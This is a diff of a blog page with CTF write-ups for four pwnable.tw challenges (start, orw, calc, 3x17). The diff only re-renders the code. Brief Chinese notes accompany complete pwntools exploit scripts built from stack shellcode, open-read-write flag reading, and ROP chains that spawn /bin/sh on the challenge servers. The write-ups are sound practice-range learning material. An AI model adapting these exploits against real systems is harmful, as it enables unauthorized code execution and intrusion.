@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 from pwn import *  #sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\">
+    <meta name="description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.tw">
 <meta property="og:url" content="https://xidoo123.github.io/2020/07/03/pwnable-tw/index.html">
 <meta property="og:site_name" content="Stay hungry">
-<meta property="og:description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 from pwn import *  #sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\">
+<meta property="og:description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-07-03T12:40:23.000Z">
 <meta property="article:modified_time" content="2020-11-07T08:20:29.376Z">
@@ -143,149 +143,20 @@
 
   <div class="content" itemprop="articleBody">
     <h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>开幕雷击，没有完整程序。分析汇编考虑在栈上填充<code>shellcode</code> ，得想办法泄露栈地址。发现程序本身<code>sys_write</code> 调用前有<code>mov ecx,esp</code> ，所以覆盖到这个地方就可以打印<code>esp</code> 值指向的内容，这个内容经过调试发现与<code>esp</code>的值差<code>0x4</code> ，故解决。</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sc="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sc = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">io.send(<span class="string">'a'</span>*<span class="number">20</span>+p32(<span class="number">0x08048087</span>))</span><br><span class="line"></span><br><span class="line">esp = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x4</span></span><br><span class="line">success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">io.send( <span class="string">'a'</span>*<span class="number">20</span> + p32(esp+<span class="number">24</span>) + sc)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-#sc=&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;
-sc = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;
-context.log_level = &#39;debug&#39;
-io = remote(&quot;chall.pwnable.tw&quot;, 10000)
-
-io.recvuntil(&quot;Let&#39;s start the CTF:&quot;)
-io.send(&#39;a&#39;*20+p32(0x08048087))
-
-esp = u32(io.recv(4)) - 0x4
-success(&quot;esp:&quot;+hex(esp))
-io.send( &#39;a&#39;*20 + p32(esp+24) + sc)
-
-io.interactive()</code></pre>
 <h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>seccomp只允许orw，用shellcraft写</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line"><span class="comment"># push “/home/orw/flag/"字符串</span></span><br><span class="line">shellcode += shellcraft.i386.pushstr(<span class="string">"/home/orw/flag"</span>)    </span><br><span class="line"><span class="comment"># open(esp) esp即为“/home/orw/flag/"字符串，打开的fd保存在eax中</span></span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">"SYS_open"</span>, <span class="string">'esp'</span>)  </span><br><span class="line"><span class="comment"># read(eax,esp,0x30) 将fd对应的文件读0x30个字节到esp</span></span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">"SYS_read"</span>, <span class="string">'eax'</span>, <span class="string">'esp'</span>, <span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># write(1,esp,0x30) 打印esp的0x30个字节到控制台</span></span><br><span class="line">shellcode += shellcraft.i386.linux.syscall(<span class="string">"SYS_write"</span>, <span class="number">1</span>, <span class="string">'esp'</span>, <span class="number">0x30</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-p = remote(&quot;chall.pwnable.tw&quot;, 10001)
-shellcode = &quot;&quot;
-# push “/home/orw/flag/&quot;字符串
-shellcode += shellcraft.i386.pushstr(&quot;/home/orw/flag&quot;)    
-# open(esp) esp即为“/home/orw/flag/&quot;字符串，打开的fd保存在eax中
-shellcode += shellcraft.i386.linux.syscall(&quot;SYS_open&quot;, &#39;esp&#39;)  
-# read(eax,esp,0x30) 将fd对应的文件读0x30个字节到esp
-shellcode += shellcraft.i386.linux.syscall(&quot;SYS_read&quot;, &#39;eax&#39;, &#39;esp&#39;, 0x30)
-# write(1,esp,0x30) 打印esp的0x30个字节到控制台
-shellcode += shellcraft.i386.linux.syscall(&quot;SYS_write&quot;, 1, &#39;esp&#39;, 0x30)
-p.recvuntil(&quot;:&quot;)
-p.send(asm(shellcode))
-p.interactive()</code></pre>
 <h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>逆向要求较高，实现了一个计算器，但由于存储操作数的数组第一个是放的个数，通过畸形表达式比如<code>+5</code> 可以把个数变为5，进一步可以实现任意位置改写。</p>
 <p>由于开了nx，所以需要构造rop链执行<code>execve(&quot;/bin/sh&quot;)</code>来getshell</p>
 <p>用<code>syscall</code>，调用号为11。</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment"># s=process("./calc")</span></span><br><span class="line">s = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10100</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment">#ROPgadget</span></span><br><span class="line"> </span><br><span class="line">pop_eax=<span class="number">0x805c34b</span></span><br><span class="line"> </span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x80701d0</span></span><br><span class="line"> </span><br><span class="line">int_80=<span class="number">0x8049a21</span></span><br><span class="line"> </span><br><span class="line">str_bin=<span class="number">0x6e69622f</span></span><br><span class="line"> </span><br><span class="line">str_sh=<span class="number">0x0068732f</span></span><br><span class="line"> </span><br><span class="line">pop_ebx=<span class="number">0x080481d1</span></span><br><span class="line"></span><br><span class="line">val=[<span class="number">0x805c34b</span>,<span class="number">11</span>,<span class="number">0x80701d0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8049a21</span>,<span class="number">0x6e69622f</span>,<span class="number">0x0068732f</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># eax=11 edx=ecx=0 ebx=bin_addr</span></span><br><span class="line"><span class="comment"># 将栈布局改变为val</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------   (361)（返回地址）     </span></span><br><span class="line"><span class="comment">#  0x805c34b    </span></span><br><span class="line"><span class="comment"># ----------   (362)</span></span><br><span class="line"><span class="comment">#  	  11  </span></span><br><span class="line"><span class="comment"># ----------   (363)</span></span><br><span class="line"><span class="comment">#  0x80701d0</span></span><br><span class="line"><span class="comment">#    ...</span></span><br><span class="line"><span class="comment"># ----------   (369)</span></span><br><span class="line"><span class="comment">#   "/bin"</span></span><br><span class="line"><span class="comment"># ----------   (370)</span></span><br><span class="line"><span class="comment">#  "/sh\x00"</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"===\n"</span>,<span class="string">"+360"</span>)</span><br><span class="line"> </span><br><span class="line">main_ebp=(int(s.recvline()))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_ebp:"</span>+str(main_ebp)</span><br><span class="line"> </span><br><span class="line">main_esp=((main_ebp+<span class="number">0x100000000</span>)&amp;<span class="number">0xfffffff0</span>)<span class="number">-16</span></span><br><span class="line"> </span><br><span class="line">bin_addr=(<span class="number">7</span>-(main_ebp+<span class="number">0x100000000</span>-main_esp)/<span class="number">4</span><span class="number">-1</span>)*<span class="number">4</span>+main_ebp</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_addr:"</span>+str(bin_addr)</span><br><span class="line"> </span><br><span class="line">val[<span class="number">5</span>]=bin_addr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line"> </span><br><span class="line">	s.sendline(<span class="string">"+36"</span>+str(i+<span class="number">1</span>))</span><br><span class="line"> </span><br><span class="line">	value=int(s.recvline())</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">print</span> <span class="string">"stack_36"</span>+str(i+<span class="number">1</span>)+<span class="string">": "</span>+str(hex(value))</span><br><span class="line"> </span><br><span class="line">	diff=val[i]-value</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span> diff&lt;<span class="number">0</span>:</span><br><span class="line"> </span><br><span class="line">		s.sendline(<span class="string">"+36"</span>+str(i+<span class="number">1</span>)+str(diff))</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line"> </span><br><span class="line">		s.sendline(<span class="string">"+36"</span>+str(i+<span class="number">1</span>)+<span class="string">"+"</span>+str(diff))</span><br><span class="line"> </span><br><span class="line">	value=int(s.recvline())</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">print</span> <span class="string">"stack_36"</span>+str(i+<span class="number">1</span>)+<span class="string">": "</span>+str(hex(value))</span><br><span class="line"> </span><br><span class="line">s.sendline(<span class="string">"getshell"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
 
-# s=process(&quot;./calc&quot;)
-s = remote(&quot;chall.pwnable.tw&quot;,10100) 
-
-#ROPgadget
-
-pop_eax=0x805c34b
-
-pop_edx_ecx_ebx=0x80701d0
-
-int_80=0x8049a21
-
-str_bin=0x6e69622f
-
-str_sh=0x0068732f
-
-pop_ebx=0x080481d1
-
-val=[0x805c34b,11,0x80701d0,0,0,0,0x8049a21,0x6e69622f,0x0068732f]
-
-# eax=11 edx=ecx=0 ebx=bin_addr
-# 将栈布局改变为val
-
-
-# ----------   (361)（返回地址）     
-#  0x805c34b    
-# ----------   (362)
-#        11  
-# ----------   (363)
-#  0x80701d0
-#    ...
-# ----------   (369)
-#   &quot;/bin&quot;
-# ----------   (370)
-#  &quot;/sh\x00&quot;
-
-
-s.sendlineafter(&quot;===\n&quot;,&quot;+360&quot;)
-
-main_ebp=(int(s.recvline()))
-
-print &quot;main_ebp:&quot;+str(main_ebp)
-
-main_esp=((main_ebp+0x100000000)&amp;0xfffffff0)-16
-
-bin_addr=(7-(main_ebp+0x100000000-main_esp)/4-1)*4+main_ebp
-
-print &quot;bin_addr:&quot;+str(bin_addr)
-
-val[5]=bin_addr
-
-
-for i in range(0,9):
-
-    s.sendline(&quot;+36&quot;+str(i+1))
-
-    value=int(s.recvline())
-
-    print &quot;stack_36&quot;+str(i+1)+&quot;: &quot;+str(hex(value))
-
-    diff=val[i]-value
-
-    if diff&lt;0:
-
-        s.sendline(&quot;+36&quot;+str(i+1)+str(diff))
-
-    else:
-
-        s.sendline(&quot;+36&quot;+str(i+1)+&quot;+&quot;+str(diff))
-
-    value=int(s.recvline())
-
-    print &quot;stack_36&quot;+str(i+1)+&quot;: &quot;+str(hex(value))
-
-s.sendline(&quot;getshell&quot;)
-
-
-s.interactive()</code></pre>
 <h2 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h2><p>程序控制流如何跟踪，程序流程不明</p>
 <p><a href="https://kirin-say.top/2019/02/08/pwnable-tw-3x17/" target="_blank" rel="noopener">https://kirin-say.top/2019/02/08/pwnable-tw-3x17/</a> Kirin师傅题解</p>
-<pre><code class="python">from pwn import *
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#p=process("3x17")</span></span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_fini_array</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>)+p64(<span class="number">0x401b6d</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop_chain</span></span><br><span class="line">pop_rdi=<span class="number">0x401696</span></span><br><span class="line">pop_rax=<span class="number">0x41e4af</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x44a309</span></span><br><span class="line">bin_sh_addr=<span class="number">0x4b4140</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4100</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdi))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4108</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(bin_sh_addr)+p64(pop_rax)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4120</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4138</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x446e2c</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x401c4b</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-#context.log_level=&quot;debug&quot;
-#p=process(&quot;3x17&quot;)
-p=remote(&quot;chall.pwnable.tw&quot;,10105)
-
-#_fini_array
-p.sendlineafter(&quot;addr:&quot;,str(0x4b40f0))
-p.sendafter(&quot;data:&quot;,p64(0x402960)+p64(0x401b6d))
-
-#rop_chain
-pop_rdi=0x401696
-pop_rax=0x41e4af
-pop_rdx_rsi=0x44a309
-bin_sh_addr=0x4b4140
-p.sendlineafter(&quot;addr:&quot;,str(0x4b4100))
-p.sendafter(&quot;data:&quot;,p64(pop_rdi))
-p.sendlineafter(&quot;addr:&quot;,str(0x4b4108))
-p.sendafter(&quot;data:&quot;,p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
-p.sendlineafter(&quot;addr:&quot;,str(0x4b4120))
-p.sendafter(&quot;data:&quot;,p64(pop_rdx_rsi)+p64(0)+p64(0))
-p.sendlineafter(&quot;addr:&quot;,str(0x4b4138))
-p.sendafter(&quot;data:&quot;,p64(0x446e2c)+&quot;/bin/sh\x00&quot;)
-
-#get_shell
-p.sendlineafter(&quot;addr:&quot;,str(0x4b40f0))
-p.sendafter(&quot;data:&quot;,p64(0x401c4b))
-p.interactive()</code></pre>
 
   </div>
 </article>
